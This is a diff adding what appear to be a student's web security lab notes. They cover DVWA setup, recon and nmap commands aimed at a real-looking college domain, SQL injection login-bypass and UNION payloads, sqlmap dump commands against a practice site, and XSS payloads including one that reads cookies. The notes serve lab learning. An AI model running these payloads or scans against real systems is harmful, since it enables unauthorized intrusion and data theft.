@@ -1,0 +1,70 @@
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git 
+cd DVWA
+cp config/config.inc.php.dist config/config.inc.php
+sudo service mariadb start 
+sudo mysql -u root -p 
+create database dvwa;
+create user dvwa@127.0.0.1 identified by 'p@ssw0rd';
+grant all on dvwa.* to dvwa@localhost;
+flush privileges;
+exit
+sudo service apache2 start
+
+
+3]
+ping -c 4 wikipedia.org
+dig sakec.ac.in A
+assetfinder sakec.ac.in
+whatweb sakec.ac.in
+https://www.wappalyzer.com/lookup/sakec.ac.in/
+
+
+2]SQL injection
+L0:1' OR '1'='1'#
+
+4]OSINT
+whatweb sakec.ac.in
+dirb http://testphp.vulnweb.com
+whois youtube.com
+nmap -sV -sC sakec.ac.in  
+
+5] Session management
+6] Brute forcing auth
+
+1. Bypassing Authentication using SQL injection 
+administrator'--
+https://portswigger.net/web-security/sql-injection/lab-login-bypass
+
+2. Extracting Data using the UNION attack 
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+?category=Lifestyle'+UNION+SELECT+NULL,'orEnb9',NULL–
+
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+filter?category=Accessories%27+UNION+SELECT+username,+password+FROM+users--
+
+3. Blind SQL injection 
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables --batch
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T products --columns --batch
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T products --dump --batch
+
+
+
+
+
+7] XSS Vulnerabilities
+Reflected
+L0:<script>alert('XSS')</Script>
+L1:<scriPt>alert('XSS')</sCrIpt>
+L2:<img src=x onerror=alert(1)>
+
+Stored
+L0:<script>alert(document.domain)</script>
+L1:<img src=x onerror=alert(document.cookie)>
+L2:<body onload=alert('Bugbot19')>
+
+
+
